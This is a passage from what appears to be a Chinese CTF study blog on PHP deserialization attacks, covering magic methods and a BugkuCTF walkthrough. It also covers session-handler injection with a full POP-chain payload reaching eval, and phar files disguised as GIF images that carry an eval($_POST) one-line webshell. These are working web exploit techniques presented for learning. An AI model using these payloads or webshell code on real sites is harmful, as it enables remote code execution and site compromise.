punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用PrintData 输出数据</span><span class="token variable">$usr</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">print_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//反序列化后的结果：Leo is 18 years old</span></code></pre><h4 id="4-魔术方法"><a href="#4-魔术方法" class="headerlink" title="4.魔术方法"></a>4.魔术方法</h4><pre><code>__construct(), 类的构造函数，创建对象时默认调用__sleep(), 执行serialize()时，先会调用这个函数__destruct(), 类的析构函数,清除对象时默认调用__wakeup(), 执行unserialize()时，先会调用这个函数__call(), 在对象中调用一个不可访问方法时调用__toString(), 打印一个对象时，如果定义了__toString0方法,就能在测试时,通过echo打印对象体,对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。调用echo时会默认调用__tostring方法__calltatic(), 用静态方式中调用一个不可访问方法时调用__jinvoke(), 调用函数的方式调用一个对象时的回应方法__get(), 获得一个类的成员变量时调用__set_state(), 调用var_export()导出类时， 此静态方法会被调用。__set(), 设置-个类的成员变量时调用__clone(), 当对象复制完成时调用__jsset(), 当对不可访问属性调用isset()或empty()时调用__autoload(), 尝试加载未定义的类__unset(), 当对不可访问属性调用unset()时被调用。__debugInfo(), 打印所需调试信息//类似于c++类中的构造析构函数，默认存在，也可重写</code></pre><h4 id="5-题目demo：解题必须包含带有定义类的那个php以及传入序列化字符"><a href="#5-题目demo：解题必须包含带有定义类的那个php以及传入序列化字符" class="headerlink" title="5.题目demo：解题必须包含带有定义类的那个php以及传入序列化字符"></a>5.题目demo：解题必须包含<code>带有定义类的那个php</code>以及传入<code>序列化</code>字符</h4><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//此代码为假的迷惑代码</span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"txt"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GEE</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"welcome to the bugkuctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"hello admin!&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//hint.php</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"you are not admin "</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">></span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">//这就是本题的陷阱，看起来先文件包含漏洞，如果用file传入flag.php，会被直接过滤掉。</span><span class="token comment" spellcheck="true">//遇见file_get_contents($user,'r')该函数，尝试使用  txt=php://input/  去传入值，post数据 welcome to the bugkuctf，失败就用下面的方法：</span><span class="token comment" spellcheck="true">//用file=php://filter/convert.base64-encode/resource=index.php 去查看真实的index的源代码，看过滤规则</span><span class="token comment" spellcheck="true">//用file=php://filter/convert.base64-encode/resource=hint.php 去阅读hint.php的代码</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//hint.php的内容为:</span><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//flag. php </span>    <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string">"good"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//该文件内容为定义了一个Flag类，里面包含一个变量，一个函数</span><span class="token comment" spellcheck="true">//__tostring()这个方法，会在调用echo时自动调用</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//此代码为真实的index.php的内容</span><span class="token delimiter">&lt;?php</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"txt"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token string">"welcome to the bugkuctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"hello friend!&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span> <span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"现在不能告诉你flag哦 "</span> <span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"you are not the number of bugku ! "</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//注意：此处有unserialize()函数，反序列化函数</span><span class="token comment" spellcheck="true">//通过这个函数，将构造的序列化字符重新转换为类的变量值（就是hint.php中Flag类的那个file变量值）</span><span class="token comment" spellcheck="true">//反序列化除了需要传入序列化字符外，还需要在该页面包含定义类的那个php文件，所以用传参file=hint.php</span><span class="token comment" spellcheck="true">//答案出。</span></code></pre><h4 id="6-注意点："><a href="#6-注意点：" class="headerlink" title="6.注意点："></a>6.注意点：</h4><ul><li><p><code>private类型的变量</code>：\x00 + 类名 + \x00 + 变量名</p></li><li><p><code>protect类型的变量</code>：\x00 + * + \x00 + 变量名 （构造序列时，通过php软件直接生成就行，不要自己手写）</p></li><li><p>可以将生成的序列，通过url转码，直接传url码也可以</p></li><li><p>绕过对序列的正则匹配：序列中的数字加<code>+</code>号（+需要进行url转码）</p></li></ul><ul><li>php bug：当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>函数的执行，将表示对象个数的数字加一，其他不变</li></ul><h4 id="7-session-反序列化"><a href="#7-session-反序列化" class="headerlink" title="7.session 反序列化"></a>7.session 反序列化</h4><ul><li>PHP内置了多种处理器，用于存取$_SESSION数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：</li></ul><table><thead><tr><th>处理器</th><th>对应的存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize()函数反序列处理的值： `a</td></tr><tr><td>php_binary</td><td>键名的长度对应的ASCII字符+键名+经过serialize()函数反序列处理的值</td></tr><tr><td>php_serialize<br/>(php&gt; -5.5.4)</td><td>经过serialize()函数反序列处理的数组   <code>a:1:{s:1:&quot;a&quot;;s:3:&quot;123&quot;;}</code> a=123</td></tr></tbody></table><ul><li><p>需要配置：session.serialize_handler</p></li><li><p>session.auto_start=off时，两个脚本注册session会话时使用的序列化处理器不同，就会出现安全问题。start=on时不会出现问题。</p></li><li><p>php_serialize生成的session，用php处理器去反序列化，会出现安全问题</p></li><li><p>如果PHP在反序列化存储的$_SESSION数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据</p></li><li><p><strong>思路及前提</strong>：题目中使用了<strong>两种序列化处理器</strong>，在php_s处理器页面构造序列，在PHP处理器进行反序列（加上<code>|</code>）</p></li></ul><pre><code>  当存储是 php_serialize 处理， 然后调用时 php 去处理。  如果这时候 注入 的数据是a=|O:4:&quot;test&quot;:0:{}           那么session中的内容是a:1:{s:1:&quot;a&quot;;s:16:&quot; | O:4:&quot;test&quot;:0:}&quot;;}  使用php处理器对该序列进行反序列化，php会将竖线“|” 看作分隔符，将竖线后的进行反序列化  竖线前的  a:1:{s:1:&quot;a&quot;;s:16:&quot; 在经过php解析后是被看成键名。  我们可控制 竖线后的内容 进行反序列化  后面就是一个实例化test对象的注入</code></pre><p>  ​    </p><ul><li>16年安恒的一道题目：（index.php  class.php  phpinfo.php）</li></ul><pre class=" language-php"><code class="language-php">    <span class="token comment" spellcheck="true">//题目主页的代码</span>    <span class="token delimiter">&lt;?php</span>    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">"./class.php"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token string">"phpinfo.php"</span><span class="token punctuation">;</span>    <span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php">    <span class="token comment" spellcheck="true">//class文件</span>    <span class="token delimiter">&lt;?php</span>    <span class="token function">highiight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'PHP_ SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//show_source(__FILE__) ;</span>    <span class="token keyword">class</span> <span class="token class-name">foo1</span><span class="token punctuation">{</span>            <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>            <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span><span class="token operator">-</span><span class="token operator">></span><span class="token string">" index.php"</span> <span class="token punctuation">;</span>            <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                            <span class="token keyword">echo</span> <span class="token string">"&lt;br>文件"</span> <span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span><span class="token punctuation">.</span> <span class="token string">"存在&lt;br>"</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token keyword">echo</span> <span class="token string">"&lt;br>这是 foo1的析构函数&lt;br>"</span> <span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">foo2</span><span class="token punctuation">{</span>            <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>            <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>            <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token string">'1234567890'</span><span class="token punctuation">;</span>                    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span> <span class="token operator">=</span> nu1l<span class="token punctuation">;</span>            <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span><span class="token punctuation">;</span>            <span class="token keyword">function</span> <span class="token function">__desctuct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string">"&lt;br> 这是foo2的析构函数&lt;br>"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">foo3</span><span class="token punctuation">{</span>            <span class="token keyword">public</span> <span class="token variable">$varr</span><span class="token punctuation">;</span>            <span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">__desctuct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string">"&lt;br>这是foo3的析构函数&lt;br>"</span> <span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token delimiter">?></span></code></pre><ul><li><p>phpinfo.php界面中获取的信息是  序列化处理器是 php_serialize</p></li><li><p>解析思路：<br>利用的时 foo3 中的execute()函数的 eval() 函数，该函数 execute() 会在 foo2 对象的 toString() 函数调用时被调用，调用 tostring() 函数需要使用echo函数，此时只能使用 foo1 的 __destruct() 去使用 echo （php在执行结束时就会自动销毁对象，调用__destruct函数）。其他的不行。所以，使用文件上传的那个代码，把序列传入phpinfo.php。进而传入到index.php界面中。</p></li><li><p>使用phpinfo.php界面生成序列的方法：（使用文件包含的一个思路）下面的代码保存为html文件：</p></li></ul><pre class=" language-html"><code class="language-html">    //传递文件的代码：    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>文件上传给的php页面<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ryat<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span>  <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    //本题中 “文件上传给的php页面” 是 那个phpinfo.php，就是将序列值传给phpinfo界面</code></pre><ul><li>打开bp，浏览器访问该文件，用bp截取返回的结果，查看session是不是可以利用</li></ul><pre class=" language-php"><code class="language-php">    <span class="token comment" spellcheck="true">//配合class.php文件生成序列：</span>    <span class="token comment" spellcheck="true">//先生成三个对象</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//给对象赋值：</span>    <span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token string">"phpinfo();"</span>  <span class="token comment" spellcheck="true">//用phpinfo测试</span>    <span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//调用的是$c的exec函数</span>    <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">varr</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">//打印$b这个对象时，才会调用$b的__tostring函数</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//使用的是$a的 序列，因为最终的赋值  关系类似于：a(b(c))</span>                             <span class="token comment" spellcheck="true">//通过index界面的$obj = new foo1();语句也可以知道，需要用$a的序列</span>    <span class="token comment" spellcheck="true">//序列：</span>    <span class="token comment" spellcheck="true">//0:4:"foo1":1:{s:4:"varr";0:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";0:4:"foo3":1:{s:4:"varr";s:10:"phpinfo();";}}}</span>    <span class="token comment" spellcheck="true">//在该序列前加竖线 | ，然后使用上传文件的那个代码，</span>    <span class="token comment" spellcheck="true">//打开bp进行截取，浏览器访问该文件（就是把序列上传到phpinfo页面，让它用php_serialize处理器解析）</span>    <span class="token comment" spellcheck="true">//将ryat配合序列：  ryat|0:4:"foo1":1:{s:4:"varr";0:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";0:4:"foo3":1:{s:4:"varr";s:10:"phpinfo();";}}}</span>    <span class="token comment" spellcheck="true">//这样，反序列完成，赋值成功</span>    <span class="token comment" spellcheck="true">//打开index页面，就执行eval函数了</span></code></pre><h4 id="8-phar反序列化"><a href="#8-phar反序列化" class="headerlink" title="8.phar反序列化"></a>8.phar反序列化</h4><ul><li>可利用函数：</li></ul><pre class=" language-php"><code class="language-php">fileatime  filectime  file_exists  file_get_contents file_put_contents file  filegroup fopenfileinode  filemtime  fileowner  fileperms  is_dir  is_executable is_file  is_link  is_readableis_writable  is_writeable  parse_ini_file  copy  unlink  stat  readfile  </code></pre><ul><li><p>如果phar://不能出现在头几个字符怎么办：</p><ul><li><code>demo.php?filename=compress.bzip2://phar://upload_file/shell.gif/a</code> </li></ul></li><li><p>链接：</p><ul><li><a href="https://www.freebuf.com/column/198945.html" target="_blank" rel="noopener">https://www.freebuf.com/column/198945.html</a> </li><li><a href="https://kylingit.com/blog/由phpggc理解php反序列化漏洞/" target="_blank" rel="noopener">https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a> </li><li><a href="https://www.freebuf.com/articles/web/205943.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/205943.html</a> </li></ul></li><li><p>phar函数识别文件：</p></li><li><p>仅通过 <code>&lt;?php __halt_compiler()?&gt;</code>来识别文件是否为phar，因此可以在该语句前面加入任何文件头来伪造成其他文件，绕过检测</p></li></ul><pre class=" language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//生成phar文件的php代码，注意要将 php.ini 中的 phar.readonly 选项设置为 Off，否则无法生成 phar 文件</span>  <span class="token delimiter">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">comrare</span><span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token variable">$haha</span> <span class="token operator">=</span> <span class="token string">'comrarezzzzz'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//此处应该结合题目的class</span>  <span class="token punctuation">}</span>  @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'shell.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"shell.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为 phar</span>  <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">comrare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//$object ->haha= 'eval(@$_POST[\'a\']);';  //一句话</span>  <span class="token variable">$object</span> <span class="token operator">-</span><span class="token operator">></span><span class="token property">haha</span><span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>  <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的 meta-data 存入 manifest</span>  <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>  <span class="token comment" spellcheck="true">//签名自动计算</span>  <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//类似代码：</span>  <span class="token delimiter">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">AnyClass</span><span class="token punctuation">{</span>      <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string">'echo "cck";'</span><span class="token punctuation">;</span>      <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$object</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token operator">=</span> <span class="token string">'eval(@$_POST[\'a\']);'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//$object -> output= 'phpinfo();';</span>  <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token delimiter">?></span></code></pre><h4 id="9-寻找POP链"><a href="#9-寻找POP链" class="headerlink" title="9.寻找POP链"></a>9.寻找POP链</h4><ul><li>看代码吧</li><li><a href="https://www.freebuf.com/column/203767.html" target="_blank" rel="noopener">https://www.freebuf.com/column/203767.html</a> </li><li><a href="https://www.freebuf.com/column/203769.html" target="_blank" rel="noopener">https://www.freebuf.com/column/203769.html</a> </li></ul><h4 id="10-奇特思路"><a href="#10-奇特思路" class="headerlink" title="10.奇特思路"></a>10.奇特思路</h4><ul><li>使用php处理器进行序列化后，会自动生成带有竖线的序列（我们不可控。。怎么办）</li><li>添加东西，使自带竖线后的序列不符合规则，那么，php处理器就会自动寻找下一个竖线（我们传入的竖线），后面的内容可控。哈哈哈哈</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2020/03/26/ming-ling-zhi-xing/"/>
      <url>/2020/03/26/ming-ling-zhi-xing/</url>
      
